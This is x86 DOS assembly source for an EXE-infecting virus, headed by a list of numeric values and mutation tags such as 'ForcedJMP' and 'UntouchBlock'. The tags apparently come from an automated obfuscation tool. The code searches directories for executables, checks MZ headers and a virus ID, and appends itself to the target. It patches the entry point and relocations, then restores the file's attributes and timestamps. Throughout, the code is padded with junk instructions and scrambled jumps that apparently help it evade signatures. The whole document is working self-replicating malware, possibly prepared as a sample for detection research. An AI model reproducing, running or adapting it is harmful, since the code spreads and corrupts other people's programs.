;0.789788989764
;0.739670280177
;0.674611631298
;UntouchBlock_1
;0.698553376026
;0.845299524584
;0.539492915134
;0.752003083985
;0.554215778432
;UntouchBlock_1
;0.7770997121
;0.967272757522
;ForcedJMP_1
;0.652984396824
;0.841487044619
;0.548477537984
;ForcedJMP_1
;0.679431671003
;0.549833118114
;0.432347410983
;0.577007351817
;ForcedJMP_0
;0.668275491339
;		JZ 	_0
;0.5367983245
;ForcedJMP_0
;0.468786775704
;0.474878775125
;0.654137830754
;0.583413133263
;0.811612615635
;0.469044312814
;ForcedJMP_0
;0.59818706519
;0.632378808142
;0.707129516078
;0.360559352134
;0.52099643613
;		JNZ 	_1
;0.438181853222
;0.442377491415
;ForcedJMP_1
;0.659290005687
;0.497215469786
;0.920955592527
;UntouchBlock_1
;0.559450880482
;0.538329491814
;ForcedJMP_0
;0.784226406701
;ForcedJMP_1
;0.539895599131
;0.625355265128
;		JNZ 	_1
;0.478958159917
;0.488372700554
;0.823321020681
;0.507659439652
;0.553487274915
;0.398919224641
;0.471854301135
;0.423513576308
;ForcedJMP_0
;0.50550067206
;UntouchBlock_0
;0.397868698934
;0.674104750519
;0.482751964501
;0.406583057429
;0.497507431939
;0.590047506859
;UntouchBlock_0
;0.398438396007
;0.46713358373
;0.447503580064
;0.548898038433
;0.719949287132
;UntouchBlock_1
;0.461962737802
;0.465378690388
;		JZ 	_0
;0.377873170844
;NoMutation
;0.6172761971
;ForcedJMP_1
;0.376180247431
;0.397311051288
;0.369562036509
;0.34969697944
;0.377655461189
;0.325936872979
;0.39602934123
;		JZ 	_0
;0.445379094922
;ForcedJMP_0
;0.300959024424
;ForcedJMP_1
;0.302047920717
;0.370203895417
;0.290566344059
;		JNZ 	_0
;0.421965290752
;		JNZ 	_1
;0.311294062338
;0.462813614396
;ForcedJMP_0
;0.270452748737
;UntouchBlock_1
;0.272677265468
;0.331443613505
;0.246479271077
;0.336386579144
;0.285694104925
;0.246212417005
;0.236799935834
;		JZ 	_0
;0.281817458159
;UntouchBlock_0
;0.183629995644
;0.192974510623
;0.214534410156
;0.144306320455
;		JNZ 	_0
;0.123389771499
;0.155944118345
;0.100462227589
;0.143758680049
;ForcedJMP_0
;0.112449815109
;0.142584335654
;UntouchBlock_0
;0.107128277048
;ForcedJMP_0
;0.0781036300445
;UntouchBlock_1
;		JZ 	_1
;ForcedJMP_1
 		.SEQ ;segments must appear in sequential order
HOSTSEG SEGMENT BYTE
 		ASSUME CS:HOSTSEG,SS:HSTACK
PGMSTR DB ’ABC.EXE’,0
HOST:
	 mov ax,cs 
	 mov ds,ax
	 mov dx,OFFSET PGMSTR
	 mov ah,41H
	 int 21H 
	 mov ah,4CH
	 mov al,0
	 int 21H 
HOSTSEG ENDS
HSTACK SEGMENT PARA STACK
db 100H dup (?)
HSTACK ENDS
STACKSIZE EQU 100H 
NUMRELS EQU 2 
VSEG SEGMENT PARA
 	 ASSUME CS:VSEG,DS:VSEG,SS:VSTACK
VIRUSID 	DW 0C8AAH 
OLDDTA 		DD 0 
DTA1 		DB 2BH dup (?) 
DTA2		DB 56H dup (?) 
EXE_HDR 	DB 1CH dup (?) 
EXEFILE 	DB ’\*.EXE’,0 
ALLFILE 	DB ’\*.*’,0 
USEFILE 	DB 78 dup (?) 
LEVEL 		DB 0 
HANDLE 		DW 0 
FATTR 		DB 0 
FTIME 		DW 0 
FDATE 		DW 0 
FSIZE 		DD 0 
VIDC 		DW 0 
GMMCA:
		call 	 _DPTU
MAXED:
		call 	 OTFOB
LWWPI:
		call 	 TJUJZ
VCODE 		DB 1 


VIRUS:
		 push ax
		 mov ax,cs
		cmp 	bx,bx
JNZ OTFOB
JMP MAXED
OTFOB:
		 mov ds,ax 						
		cmp 	ax,dx
JNZ TJUJZ
JMP LWWPI
TJUJZ:
		 mov ax,es 						
		cmp 	bx,bx
JZ _DPTU
JMP GMMCA
_DPTU:
		 mov WORD PTR [OLDDTA+2],ax 	
		 call SHOULDRUN 				
		 jz   N1
		 JMP  REL1
		 N1: 						
		 call SETSR 
		 call NEW_DTA 					
		 call FIND_FILE 				
		 jz   N2
		 JMP  FINISH 					
		 N2:
		 call SAVE_ATTRIBUTE 			
		 call INFECT 					
		 call REST_ATTRIBUTE 			
OFAKJ:
		call 	 _EMGD
RKCBM:
		call 	 __HOT


FINISH:  call RESTORE_DTA 	
 		 pop ax

REL1: 						
 		 mov ax,HSTACK 				
		cmp 	cx,dx
JNZ _EMGD
JMP OFAKJ
_EMGD:
 		 cli 
 		 mov ss,ax
		JMP 	RKCBM
__HOT:

REL1A: 						
 		 mov sp,OFFSET HSTACK
 		 mov es,WORD PTR [OLDDTA+2] 
		 mov ds,WORD PTR [OLDDTA+2] 
 		 sti 					

REL2:					 			
 		jmp FAR PTR HOST 


FIND_FILE:
	mov al,’\’ 
	mov BYTE PTR [USEFILE],al
	mov si,OFFSET USEFILE+1
	xor dl,dl
		JMP 	QAPCD
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
QAPCD:
	mov ah,47H
	int 21H 
	cmp BYTE PTR [USEFILE+1],0 
	jz  N3
	JMP FF2 
	N3:
	xor al,al 
	mov BYTE PTR [USEFILE],al 

FF2: mov al,2
	mov [LEVEL],al 
	call FINDBR 
	jnz N4
	JMP FF3 
	N4:
	xor al,al 
	mov BYTE PTR [USEFILE],al 
		JMP 	DQQNJ
VZXYA:
	inc al 
		JMP 	XISTD
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
XISTD:
	mov [LEVEL],al 
DQQNJ:
		call 	 VZXYA
	call FINDBR 

FF3:
	ret 

FINDBR:
	call FINDEXE 
	jc  N5
	JMP FBE3 
	N5:
	cmp [LEVEL],0 
	jnz N6
	JMP FBE1 
	N6:
	dec [LEVEL] 
	mov di,OFFSET USEFILE 
	mov si,OFFSET ALLFILE 
	call CONCAT 
	inc di
	push di 
	call FIRSTDIR 
	jz  N7
	JMP FBE 
IOQMG:
		call 	 SLRVE
	N7:

FB1: 
		pop di 
		xor al,al
		stosb
		mov di,OFFSET USEFILE
		JMP 	E_AIS
FM_OU:
		mov bx,OFFSET DTA2+1EH
		mov al,[LEVEL]
		mov dl,2BH 
		cmp 	dx,dx
JZ SLRVE
JMP IOQMG
SLRVE:
		mul dl 
		add bx,ax 
		mov si,bx
		call CONCAT 
		push di 
		call FINDBR 
		jnz N8
		JMP FBE2 
		N8:
		call NEXTDIR 
		jnz N9
		JMP FB1 
		N9:

FBE: 
		inc [LEVEL] 
		pop di 
		xor al,al 
E_AIS:
		call 	 FM_OU
		stosb

FBE1: mov al,1 
	or al,al
KAAWF:
		call 	 MPZGB
	ret

FBE2: pop di 

FBE3: xor al,al 
 	  ret 


FINDEXE:
		mov dx,OFFSET DTA1 
		mov ah,1AH
		int 21H
		mov di,OFFSET USEFILE
		JMP 	KAAWF
MPZGB:
		mov si,OFFSET EXEFILE
		call CONCAT 
		push di 
		JMP 	SPAFO
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
SPAFO:
		mov dx,OFFSET USEFILE
		JMP 	CKEKQ
_ZOTT:
		JMP 	CIEMU
GGBVT:
		mov cx,3FH 
		mov ah,4EH
CIEMU:
		call 	 GGBVT
CKEKQ:
		call 	 _ZOTT
NIQQJ:
		call 	 IT_CG
		int 21H

NEXTEXE:
		or al,al 
		jz N10
		JMP FEC 
		N10:
		pop di
		inc di
		stosb 
		mov di,OFFSET USEFILE
		mov si,OFFSET DTA1+1EH
		call CONCAT 
		dec di
		push di
		call FILE_OK 
		jc N11
		JMP FENC 
		N11:
		mov ah,4FH
		cmp 	ax,dx
JNZ IT_CG
JMP NIQQJ
IT_CG:
		JMP 	XUTVL
XWX_I:
		int 21H 
		jmp SHORT NEXTEXE 

FEC: 
	 pop di
		JMP 	IYYBI
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
IYYBI:
 	 mov BYTE PTR [di],0 
	 stc
XUTVL:
		call 	 XWX_I
	 ret

FENC:
	 pop di
	 ret


FIRSTDIR:
	 call GET_DTA
	 push dx 
	 mov ah,1AH 
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov cx,10H 
	 mov ah,4EH 
	 int 21H

NEXTD1:
	 pop bx 
	 or al,al 
	 jz N12
	 JMP NEXTD3 
	 N12:
	 test BYTE PTR [bx+15H],10H 
	 jnz N13
	 JMP NEXTDIR 
	 N13:
	 cmp BYTE PTR [bx+1EH],’.’ 
	 je N14
	 JMP NEXTD2 
	 N14:
	 
NEXTDIR: 
	 call GET_DTA 
	 push dx
	 mov ah,1AH 
	 int 21H
	 mov ah,4FH
		JMP 	FQLJM
EMKPN:
	 int 21H 
FQLJM:
		call 	 EMKPN
	 jmp NEXTD1 ;SHORT NEXTD1 -- uncomment for short jump

NEXTD2:
 	 xor al,al 

NEXTD3:
	 ret 


GET_DTA:
 mov dx,OFFSET DTA2
 mov al,2BH
 mul [LEVEL]
 add dx,ax 
 ret


CONCAT:
	 mov al,byte ptr es:[di] 
	 inc di
	 or al,al
	 jnz CONCAT ;unmodified code be careful rit
	 dec di 
	 push di 

CONCAT2:
	 cld
	 lodsb 
	 stosb
	 or al,al
	 jnz CONCAT2 ;unmodified code be careful rit
	 pop di 
	 ret 	 


FILE_OK:
	 call GET_EXE_HEADER 
	 jnc N15
	 JMP OK_END 
	 N15:
	 call CHECK_SIG_OVERLAY 
	 jnc N16
	 JMP OK_END 
	 N16:
	 call REL_ROOM 
	 jnc N17
	 JMP OK_END 
	 N17:
BGRAS:
		call 	 XI_BV
	 call IS_ID_THERE 

OK_END: ret 	 


CHECK_SIG_OVERLAY:
		 mov al,’M’ 
		 mov ah,’Z’
		JMP 	BGRAS
XI_BV:
		 cmp ax,WORD PTR [EXE_HDR]
		 jnz N18
		 JMP CSO_1
		 N18:
		 stc 
		 ret

CSO_1: 	 xor ax,ax
	     sub ax,WORD PTR [EXE_HDR+26]
	     ret 


GET_EXE_HEADER:
	 mov dx,OFFSET USEFILE
	 mov ax,3D02H 
	 int 21H
	 jnc N19
	 JMP RE_RET 
	 N19:
	 mov [HANDLE],ax 
	 mov bx,ax 
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR 
	 mov ah,3FH
	 int 21H

RE_RET: ret 
MLVWX:
		call 	 KDPVD


REL_ROOM:
	 mov ax,WORD PTR [EXE_HDR+8] 
		JMP 	MBLLK
FXWWR:
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+6] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+24] 
YZWOU:
		call 	 PDSJZ
	 cmp ax,4*NUMRELS 

MBLLK:
		call 	 FXWWR
ELVKL:
		call 	 VOFZX
RR_RET: ret     
FY_T_:
		call 	 QMGKH


IS_ID_THERE:
	 mov ax,WORD PTR [EXE_HDR+22] 
JZ PDSJZ
JMP YZWOU
PDSJZ:
	 add ax,WORD PTR [EXE_HDR+8] 
	 mov dx,16
	 mul dx
	 mov cx,dx
	 mov dx,ax 
		cmp 	dx,dx
JZ VOFZX
JMP ELVKL
VOFZX:
		cmp 	bx,ax
JNZ YQZDM
JMP PCZYB
YQZDM:
		JMP 	MLVWX
KDPVD:
	 mov bx,[HANDLE]
		JMP 	FY_T_
QMGKH:
	 mov ax,4200H 
		cmp 	ax,dx
JZ QPOFR
JMP WWDYH
QPOFR:
	 int 21H
	 mov ah,3FH
	 mov bx,[HANDLE]
	 mov dx,OFFSET VIDC
	 mov cx,2 
	 int 21H
	 jnc N20
	 JMP II_RET 
	 N20:
	 mov ax,[VIDC]
		JMP 	VXZXK
NY_JY:
	 cmp ax,[VIRUSID] 
	 clc
	 jz N21
	 JMP II_RET 
	 N21:
PCZYB:
		call 	 YQZDM
	 stc 

WWDYH:
		call 	 QPOFR
II_RET: ret
VXZXK:
		call 	 NY_JY


SETBDY:
	 mov al,BYTE PTR [FSIZE]
	 and al,0FH 
	 jnz N22
	 JMP SB_E 
	 N22:
	 mov cx,10H 
	 sub cl,al 
	 mov dx,OFFSET FINAL
	 add WORD PTR [FSIZE],cx 
	 adc WORD PTR [FSIZE+2],0
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H

SB_E: ret


INFECT:
	 mov cx,WORD PTR [FSIZE+2]
	 mov dx,WORD PTR [FSIZE]
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H 
	 call SETBDY 
		JMP 	_WFQY
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
_WFQY:
	 mov cx,OFFSET FINAL 
	 xor dx,dx 
	 mov bx,[HANDLE] 
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE] 
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1 
	 inc bx
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+14 
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
GW_PF:
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1A 
	 inc bx 
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+16 
	 mov bx,[HANDLE] 
LWCVU:
	 mov cx,2
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL2 
	 add bx,1 
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+20 
	 mov bx,[HANDLE]
YAVEY:
	 mov cx,4
	 mov ah,40H 
	 int 21H
	 xor cx,cx
	 xor dx,dx
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [FSIZE] 
PNBSB:
	 mov cl,4 
DBEGI:
	 shr ax,cl 
	 mov bx,WORD PTR [FSIZE+2]
	 and bl,0FH
	 mov cl,4
V_SRM:
	 shl bl,cl
	 add ah,bl
	 sub ax,WORD PTR [EXE_HDR+8] 
	 mov WORD PTR [EXE_HDR+22],ax
	 mov bx,OFFSET FINAL 
	 add bx,10H 
	 mov cl,4 
	 shr bx,cl
	 add ax,bx
	 mov WORD PTR [EXE_HDR+14],ax 
	 mov ax,OFFSET VIRUS 
		JMP 	XYS_D
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
XYS_D:
	 mov WORD PTR [EXE_HDR+20],ax 
	 mov ax,STACKSIZE 
	 mov WORD PTR [EXE_HDR+16],ax ;and save it
	 mov dx,WORD PTR [FSIZE+2]
	 mov ax,WORD PTR [FSIZE] 
	 mov bx,OFFSET FINAL
	 add ax,bx
	 xor bx,bx
	 adc dx,bx 
	 add ax,200H 
	 adc dx,bx
	 push ax
	 mov cl,9
	 shr ax,cl
	 mov cl,7
	 shl dx,cl
	 add ax,dx
	 mov WORD PTR [EXE_HDR+4],ax 
	 pop ax
	 and ax,1FFH 
	 mov WORD PTR [EXE_HDR+2],ax 
WTMBN:
	 mov ax,NUMRELS 
	 add WORD PTR [EXE_HDR+6],ax
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
SXOJQ:
	 mov ah,40H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+6] 
	 dec ax 
	 dec ax 
	 mov bx,4 
	 mul bx
	 add ax,WORD PTR [EXE_HDR+24]
	 mov bx,0
	 adc dx,bx 
	 mov cx,dx
	 mov dx,ax
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL1 
	 inc bx 
	 mov WORD PTR [EXE_HDR],bx 
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL2
	 add bx,3 
	 mov WORD PTR [EXE_HDR+4],bx 
	 mov WORD PTR [EXE_HDR+6],ax
	 mov cx,8 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H
	 ret 



TIMECT EQU 63 


SHOULDRUN:
	 xor ah,ah 

SR1: ret 
 	 int 1AH
 	 and dl,TIMECT 
 	 ret ;



SETSR:
	 mov al,90H 
	 mov BYTE PTR SR1,al 
	 ret


NEW_DTA:
	 mov ah,2FH 
	 int 21H
	 mov WORD PTR [OLDDTA],bx
	 mov ax,es
	 mov WORD PTR [OLDDTA+2],ax
		JMP 	ZXBJX
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
ZXBJX:
	 mov ax,cs
	 mov es,ax 
	 mov dx,OFFSET DTA1 
	 mov ah,1AH
	 int 21H 
_LMGO:
		call 	 TYBJY
	 ret

RESTORE_DTA:
	 mov dx,WORD PTR [OLDDTA] 
	 mov ax,WORD PTR [OLDDTA+2]
	 mov ds,ax
	 mov ah,1AH
	 int 21H 
	 mov ax,cs 
		cmp 	bx,bx
JNZ TYBJY
JMP _LMGO
TYBJY:
		JMP 	HOUFK
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
HOUFK:
	 mov ds,ax
	 ret	 

SAVE_ATTRIBUTE:
		JMP 	IRNYJ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
IRNYJ:
	 mov ah,43H 
		JMP 	ONM_Z
xor bx,cx
xor bx,cx
xor bx,cx
ONM_Z:
	 mov al,0
		JMP 	ZVQYL
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZVQYL:
	 mov dx,OFFSET USEFILE
	 int 21H
	 mov [FATTR],cl 
	 mov ah,43H
	 mov al,1
	 mov dx,OFFSET USEFILE
	 mov cl,0
	 int 21H
	 mov dx,OFFSET USEFILE
		JMP 	YXNBS
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
YXNBS:
	 mov al,2 
	 mov ah,3DH 
	 int 21H
	 mov [HANDLE],ax 
	 mov ah,57H 
	 xor al,al
	 mov bx,[HANDLE]
	 int 21H
	 mov [FTIME],cx 
	 mov [FDATE],dx 
	 mov ax,WORD PTR [DTA1+28] 
	 mov WORD PTR [FSIZE+2],ax 
	 mov ax,WORD PTR [DTA1+26] 
	 mov WORD PTR [FSIZE],ax
 	 ret



REST_ATTRIBUTE:
	 mov dx,[FDATE] 
	 mov cx,[FTIME]
	 mov ah,57H 
	 mov al,1
	 mov bx,[HANDLE]
	 int 21H
	 mov ah,3EH
		JMP 	DSJMN
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
DSJMN:
	 mov bx,[HANDLE]
	 int 21H
	 mov cl,[FATTR]
	 xor ch,ch
	 mov ah,43H 
	 mov al,1
		cmp 	bx,bx
JNZ DVJLP
JMP GUMDJ
DVJLP:
	 mov dx,OFFSET USEFILE
	 int 21H
GUMDJ:
		call 	 DVJLP
	 ret

FINAL: 

VSEG ENDS 	 

VSTACK SEGMENT PARA STACK
 	   db STACKSIZE dup (?)
VSTACK ENDS
	   END VIRUS 
